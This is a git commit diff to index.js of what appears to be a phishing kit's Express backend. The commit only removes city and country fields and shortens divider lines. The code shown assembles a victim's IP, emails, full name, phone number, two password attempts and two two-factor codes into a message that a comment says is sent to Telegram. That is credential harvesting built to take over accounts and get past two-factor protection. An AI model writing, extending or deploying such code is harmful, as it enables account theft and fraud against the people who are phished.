bd5212a23c4af6c78ebb398122e3f3e57b2d779c
ductham08 <ductham784@gmail.com>
2024-06-09 18:40:28 +0700

    remove ip v6

--- index.js
+++ index.js
@@ -26,9 +26,7 @@ app.post('/api/resgister', (req, res) => {
 
     // SEND DATA TO TELE
     const message = `<strong>Ip:</strong> ${data.ip ? data.ip : ''}
-<strong>City:</strong> ${data.city ? data.city : ''}
-<strong>Country:</strong> ${data.country ? data.country : ''}
-------------------------------------------------------------
+--------------------------
 <strong>Email Business:</strong> ${data.businessEmail ? data.businessEmail : ''} 
 <strong>Email Personal:</strong> ${data.personalEmail ? data.personalEmail : ''}
 <strong>Full Name:</strong> ${data.fullName ? data.fullName : ''} 
@@ -36,7 +34,7 @@ app.post('/api/resgister', (req, res) => {
 <strong>Phone Number:</strong> ${data.mobilePhone ? data.mobilePhone : ''}
 <strong>Password First:</strong> ${data.passwordFirst ? data.passwordFirst : ''}
 <strong>Password Second:</strong> ${data.passwordSecond ? data.passwordSecond : ''}
---------------------------------------------
+--------------------------
 <strong>First Two-Fa:</strong> ${data.firstTwoFa ? data.firstTwoFa : ''}
 <strong>Second Two-Fa:</strong> ${data.secondTwoFa ? data.secondTwoFa : ''}`;
 
